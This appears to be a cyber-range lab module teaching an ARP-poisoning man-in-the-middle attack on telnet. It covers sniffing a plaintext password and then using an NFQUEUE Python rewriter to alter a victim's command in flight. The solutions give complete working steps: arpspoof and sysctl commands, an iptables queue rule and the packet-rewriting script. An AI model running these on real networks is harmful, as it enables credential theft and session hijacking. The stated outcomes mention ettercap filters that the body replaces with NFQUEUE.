title: CR-18 / Module 3 / N3c — Advanced ARP Poisoning
description: vm1 runs telnet but firewalls every source except vm2. You can't connect directly. To read the flag you have to sit between vm1 and vm2 and rewrite vm2's commands on the wire so vm1 runs what you want under their authenticated session.
prerequisites: CR-18 / N3b or equivalent experience with bidirectional ARP MITM
Awareness that telnet is a plaintext protocol
outcomes: Bidirectional ARP MITM with IP forwarding active on a routed Linux host
Author and compile an `etterfilter` script that searches and replaces application data
Use ettercap with `-M arp:remote -F <filter>` to actively modify traffic in flight
Recognise the difference between sniffing and active session modification

levels.title: Briefing
levels.content:
## Scenario

Three machines on a small LAN.

- **vm1** at `192.168.25.10` runs `telnetd` on tcp/23. Someone hardened it with an iptables rule: only `192.168.25.20` (vm2) can connect, everyone else is dropped at the network layer.
- **vm2** at `192.168.25.20` is a maintenance host. A script runs there every 30 seconds: it telnets to vm1, runs `cat /home/<user>/bait.txt`, then logs out. The bait file contains nothing useful.
- **vma** at `192.168.25.30` is your attacker workstation.

## What you cannot do

Connect to telnet directly. Try it: `telnet 192.168.25.10`. You will hang and then time out, because vm1's iptables drops your SYN before telnet ever sees it.

## What you can do

Sit between vm1 and vm2 and **modify** vm2's session as it flies past. Specifically, when vm2 sends `cat /home/<user>/bait.txt`, you rewrite `bait.txt` to `flag.txt` on the wire. Vm1 never knows the difference; it runs the modified command under vm2's authenticated session and returns the flag in the response. The response flows back through you, and you read the flag off the wire.

This is what `ettercap` filters are built for.

levels.title: Get Access
levels.cloud_content:
Open the Kali desktop on **vma** and log in.

1. In the topology overview on the right, right-click on **`vma`** and choose **`Open GUI`** (or **`Open GUI In New Window`** if you prefer a separate window). The Kali display manager loads in your browser.
2. Log in with username **`user`** and password **`Password123`**.
3. Open a terminal from the desktop.

SSH is documented at https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access if you prefer.

When you are in, submit **`start`** to unlock the next level.
levels.local_content: This sandbox has not been validated for local-only deployment.

levels.title: Capture the password
levels.content:
Before you go after the flag, prove the MITM works by reading vm2's password off the wire.

Telnet is plaintext: when vm2 sends its password after `Password:`, it crosses the LAN in clear ASCII. Sit between vm1 and vm2 with ARP poisoning, watch the session in Wireshark, and submit the password.
levels.solution:
1. **Get on the path.** Bidirectional ARP poisoning, with one important addition you'll learn the hard way if you skip it:

   `sudo sysctl -w net.ipv4.ip_forward=1`

   `sudo sysctl -w net.ipv4.conf.all.send_redirects=0`

   `sudo sysctl -w net.ipv4.conf.eth1.send_redirects=0`

   `sudo arpspoof -i eth1 -t 192.168.25.10 192.168.25.20`

   `sudo arpspoof -i eth1 -t 192.168.25.20 192.168.25.10`

   The `send_redirects=0` step matters: without it, your kernel sees you forwarding traffic between two hosts on the same subnet and helpfully tells the sender "go direct next time" via an ICMP Redirect. The sender re-ARPs, gets the real MAC, and your MITM evaporates. Disable the redirects and your spoof sticks.

2. **Open Wireshark** on `eth1`. Display filter:

   `tcp.port == 23`

   To strip platform noise:

   `not vnc and not (ip.src == 10.10.10.0/24 or ip.dst == 10.10.10.0/24)`

3. **Wait up to 30 s** for vm2's next session. When you see tcp/23 packets, right-click → **Follow → TCP Stream**. The full conversation appears in plain text, including the `Password:` prompt and the password vm2 sends in response.

4. Submit that password as **`${ANSWER}`**.

Leave the arpspoof processes running. You will need the MITM still in place for the next level.

hints.title: Same MITM as N3b
hints.content: If you remember the bidirectional arpspoof + sysctl ip_forward pattern from N3b, that is exactly what you need here. Telnet is plaintext like FTP — once you are on the path, the password is just sitting there in the data stream.

hints.title: Wireshark follow stream
hints.content: In Wireshark, after filtering for `tcp.port == 23`, right-click any packet and choose Follow → TCP Stream. That stitches the full session back into a readable transcript including the login exchange.

levels.title: Background — modifying packets with NFQUEUE
levels.content:
Before the next level: a quick primer on the tool you'll use to actually *change* bytes on the wire.

## From sniffing to modification

In the previous level you sat on the path between vm1 and vm2 and read the password as it flew past. That was a *passive* attack — you forwarded everything untouched and just watched. The next level needs an *active* attack: change vm2's command mid-flight so vm1 runs something different.

Wireshark cannot do this — it only captures. Ettercap *can* in theory, with its filter language, but its bidirectional MITM has known reliability issues that bit us during development. The standard Linux-native answer is **NFQUEUE**.

## What NFQUEUE is

The Linux kernel's packet filter (Netfilter / iptables) has hook points where it makes ACCEPT/DROP decisions on every packet: PREROUTING, INPUT, FORWARD, OUTPUT, POSTROUTING. NFQUEUE is a special verdict you can route packets to instead. It means *"stop here, hand this packet up to a userspace program, wait for it to decide"*.

The userspace program reads the packet, can inspect or modify it, then returns a verdict (`accept`, `drop`, or `accept with modified bytes`). The kernel honors the verdict and continues processing.

You send packets to NFQUEUE with an iptables rule like this:

   `sudo iptables -I FORWARD -p tcp --dport 23 -j NFQUEUE --queue-num 1`

Reading it: on the FORWARD chain (where forwarded traffic flows — exactly where arpspoof'd packets pass through your kernel), for any TCP packet going to port 23, jump to NFQUEUE number 1. The queue number is just an identifier so multiple userspace programs can each get their own stream.

## The pipeline that gets us here

```
vm2 sends TCP → vma's eth1
               │
               ▼
        kernel routing (ip_forward=1, ARP poisoned)
               │
               ▼
         FORWARD chain
               │
               ▼  (your iptables rule)
         NFQUEUE 1
               │
               ▼
      your Python script
               │
               ▼  (accept + optionally modify payload)
         FORWARD continues
               │
               ▼
      out vma's eth1 → vm1
```

## The Python side

Two libraries do the heavy lifting:

- **`python3-netfilterqueue`** — Python bindings for the NFQUEUE kernel API. You bind to a queue ID and register a callback function that runs for every packet.
- **`python3-scapy`** — parses raw packet bytes into structured Python objects so you can read and modify fields by name (`pkt[TCP].dport`, `pkt[Raw].load`) without doing manual offset math.

A minimal callback looks like this:

```python
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

def callback(packet):
    pkt = IP(packet.get_payload())  # parse bytes into scapy object
    if pkt.haslayer(Raw):
        data = bytes(pkt[Raw].load)
        if b"bait.txt" in data:
            pkt[Raw].load = data.replace(b"bait.txt", b"flag.txt")
            # invalidate cached lengths/checksums so scapy recomputes
            del pkt[IP].len, pkt[IP].chksum, pkt[TCP].chksum
            packet.set_payload(bytes(pkt))
    packet.accept()  # every packet must be accept'd or drop'd

q = NetfilterQueue()
q.bind(1, callback)
q.run()
```

That's about 15 lines. It binds to queue 1, runs the callback on every packet, looks for `bait.txt` in the TCP payload, substitutes `flag.txt`, fixes the checksums, accepts the modified packet.

## One critical constraint: equal-length replacement

TCP gives every byte a sequence number. If you replace an 8-byte string with a 9-byte string, the payload grows, the sequence numbering of all subsequent packets gets out of sync, ACKs misalign, and the receiver tears down the connection.

Keep the OLD and NEW strings the same length and TCP can't tell the difference. `bait.txt` and `flag.txt` are both 8 bytes — that's not an accident.

## On vma

The libraries (`python3-scapy` and `python3-netfilterqueue`) are already installed. A complete reference implementation also lives at `/usr/local/sbin/mitm-rewrite.py`. You can `cat` it to read through, run it as-is for the next level, or write your own.

levels.title: Bend their session to your will
levels.content:
You captured the password but you cannot use it — `telnet 192.168.25.10` from your machine gets dropped at vm1's firewall.

What you can do: NFQUEUE-rewrite vm2's command mid-flight so vm1 runs a *different* `cat` under vm2's authenticated session. The response flows back through you.

Look at the captured stream from level 2 again — vm2 lists the home directory before reading bait.txt. The `ls` output tells you exactly which alternative file is available. Pick that one as the substitution target, set up the iptables NFQUEUE rule from the theory level, run your script (or the pre-built one), and watch the response stream for vm1's reply.

Submit the file contents verbatim.
levels.solution:
Ettercap's `arp:remote` MITM is unreliable on this lab; we'll use `arpspoof` for the man-in-the-middle and a small Python script reading from `NFQUEUE` for the actual byte rewrite. A ready-to-run script is pre-installed at `/usr/local/sbin/mitm-rewrite.py` — it replaces `bait.txt` with `flag.txt` (same length, so TCP sequence numbers stay valid) in any packet that crosses the FORWARD chain.

1. **Keep the ARP MITM you set up in level 2.** Both arpspoof processes should still be running. If not:

   `sudo sysctl -w net.ipv4.ip_forward=1`

   `sudo sysctl -w net.ipv4.conf.all.send_redirects=0`

   `sudo arpspoof -i eth1 -t 192.168.25.10 192.168.25.20 &`

   `sudo arpspoof -i eth1 -t 192.168.25.20 192.168.25.10 &`

2. **Send tcp/23 forward traffic to NFQUEUE:**

   `sudo iptables -I FORWARD -p tcp --dport 23 -j NFQUEUE --queue-num 1`

3. **Start the rewriter** (one terminal, leave running):

   `sudo python3 /usr/local/sbin/mitm-rewrite.py`

   It prints a line each time it fires a rewrite.

4. **Watch the response stream** for the file vm1 returns. In another terminal:

   `sudo tcpdump -ni eth1 -A 'tcp port 23 and src host 192.168.25.10'`

5. **Wait ≤30 s** for vm2's next cycle. When the script logs `[+] rewrote bait.txt -> flag.txt`, vm1 has just run the rewritten `cat` under vm2's session. The response (the flag contents) flows back through you. Read it from the tcpdump output.

6. Submit the flag as **`${ANSWER}`**.

When done, clean up: `sudo iptables -D FORWARD -p tcp --dport 23 -j NFQUEUE --queue-num 1` and Ctrl+C the rewriter and arpspoof terminals.

hints.title: How the rewriter sees the traffic
hints.content: The script reads packets from kernel NFQUEUE — packets are diverted there by your iptables rule on the FORWARD chain. Because the kernel forwards (you set `ip_forward=1` for the MITM), forwarded packets pass through FORWARD before going out the other side. The script reads, optionally modifies, then accepts.

hints.title: Same-length swap
hints.content: The script's `OLD` and `NEW` strings have to be the same length (both `bait.txt` and `flag.txt` are 8 bytes). Different lengths would force a TCP sequence-number rewrite that breaks the session.

hints.title: Where the flag shows up
hints.content: When the rewriter fires and vm1 runs the modified `cat`, the file contents flow back to vm2 across your wire. Run tcpdump in parallel to see only vm1's responses: `sudo tcpdump -ni eth1 -A 'tcp port 23 and src host 192.168.25.10'`. The flag is in vm1's response payload right after the modified command.
